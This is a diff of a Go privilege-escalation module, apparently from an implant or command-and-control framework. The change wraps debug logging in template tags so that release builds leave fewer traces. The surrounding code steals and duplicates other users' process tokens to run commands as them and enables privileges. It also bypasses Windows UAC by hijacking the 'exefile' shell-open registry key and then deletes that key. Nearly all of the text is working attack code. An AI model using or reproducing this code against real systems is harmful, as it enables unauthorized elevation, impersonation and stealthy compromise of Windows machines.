@@ -3,7 +3,9 @@
 package priv
 
 import (
+	// {{if .Debug}}
 	"log"
+	// {{end}}
 	"os"
 	"os/exec"
 	"sync"
@@ -123,13 +125,17 @@ func impersonateLoggedOnUser(hToken syscall.Token) (err error) {
 func getPrimaryToken(pid uint32) (*syscall.Token, error) {
 	handle, err := syscall.OpenProcess(syscall.PROCESS_QUERY_INFORMATION, true, pid)
 	if err != nil {
+		// {{if .Debug}}
 		log.Println("OpenProcess failed")
+		// {{end}}
 		return nil, err
 	}
 	defer syscall.CloseHandle(handle)
 	var token syscall.Token
 	if err = syscall.OpenProcessToken(handle, syscall.TOKEN_DUPLICATE|syscall.TOKEN_ASSIGN_PRIMARY|syscall.TOKEN_QUERY, &token); err != nil {
+		// {{if .Debug}}
 		log.Println("OpenProcessToken failed")
+		// {{end}}
 		return nil, err
 	}
 	return &token, err
@@ -143,7 +149,9 @@ func enableCurrentThreadPrivilege(privilegeName string) error {
 	var t syscall.Token
 	err = openThreadToken(ct, syscall.TOKEN_QUERY|TOKEN_ADJUST_PRIVILEGES, true, &t)
 	if err != nil {
+		// {{if .Debug}}
 		log.Println("openThreadToken failed", err)
+		// {{end}}
 		return err
 	}
 	defer syscall.CloseHandle(syscall.Handle(t))
@@ -156,7 +164,9 @@ func enableCurrentThreadPrivilege(privilegeName string) error {
 	}
 	err = lookupPrivilegeValue(nil, privStr, &tp.Privileges[0].Luid)
 	if err != nil {
+		// {{if .Debug}}
 		log.Println("lookupPrivilegeValue failed")
+		// {{end}}
 		return err
 	}
 	tp.PrivilegeCount = 1
@@ -170,25 +180,33 @@ func impersonateProcess(pid uint32) (newToken syscall.Token, err error) {
 	primaryToken, err := getPrimaryToken(pid)
 
 	if err != nil {
+		// {{if .Debug}}
 		log.Println("getPrimaryToken failed:", err)
+		// {{end}}
 		return
 	}
 	defer primaryToken.Close()
 
 	err = impersonateLoggedOnUser(*primaryToken)
 	if err != nil {
+		// {{if .Debug}}
 		log.Println("impersonateLoggedOnUser failed:", err)
+		// {{end}}
 		return
 	}
 	err = duplicateTokenEx(*primaryToken, syscall.TOKEN_ALL_ACCESS, &attr, SecurityDelegation, TokenPrimary, &newToken)
 	if err != nil {
+		// {{if .Debug}}
 		log.Println("duplicateTokenEx failed:", err)
+		// {{end}}
 		return
 	}
 	for _, priv := range requiredPrivileges {
 		err = enableCurrentThreadPrivilege(priv)
 		if err != nil {
+			// {{if .Debug}}
 			log.Println("Failed to set priv", priv)
+			// {{end}}
 			return
 		}
 	}
@@ -203,9 +221,13 @@ func impersonateUser(username string) (token syscall.Token, err error) {
 	for _, proc := range p {
 		if proc.Owner() == username {
 			token, err = impersonateProcess(uint32(proc.Pid()))
+			// {{if .Debug}}
 			log.Printf("[%d] %s\n", proc.Pid(), proc.Executable())
+			// {{end}}
 			if err == nil {
+				// {{if .Debug}}
 				log.Println("Got system token for process", proc.Pid(), proc.Executable())
+				// {{end}}
 				return
 			}
 		}
@@ -254,7 +276,9 @@ func bypassUAC(command string) (err error) {
 	// Wait for the command to trigger
 	time.Sleep(time.Second * 3)
 	// Clean up
+	// {{if .Debug}}
 	log.Println("cleaning the registry up")
+	// {{end}}
 	err = deleteRegistryKey(`Software\Classes\exefile\shell\open`, "command")
 	err = deleteRegistryKey(`Software\Classes\exefile\shell\`, "open")
 	return
@@ -269,17 +293,23 @@ func RunProcessAsUser(username, command, args string) (out string, err error) {
 		defer wg.Done()
 		token, err := impersonateUser(username)
 		if err != nil {
+			// {{if .Debug}}
 			log.Println("Could not impersonate user", username)
+			// {{end}}
 			return
 		}
 		cmd := exec.Command(command, args)
 		cmd.SysProcAttr = &syscall.SysProcAttr{
 			Token: token,
 		}
+		// {{if .Debug}}
 		log.Printf("Starting %s as %s\n", command, username)
+		// {{end}}
 		output, err := cmd.Output()
 		if err != nil {
+			// {{if .Debug}}
 			log.Println("Command failed:", err)
+			// {{end}}
 			return
 		}
 		out = string(output)
@@ -294,7 +324,9 @@ func Elevate() (err error) {
 	processName, _ := os.Executable()
 	err = bypassUAC(processName)
 	if err != nil {
+		// {{if .Debug}}
 		log.Println("BypassUAC failed:", err)
+		// {{end}}
 	}
 	return
 }
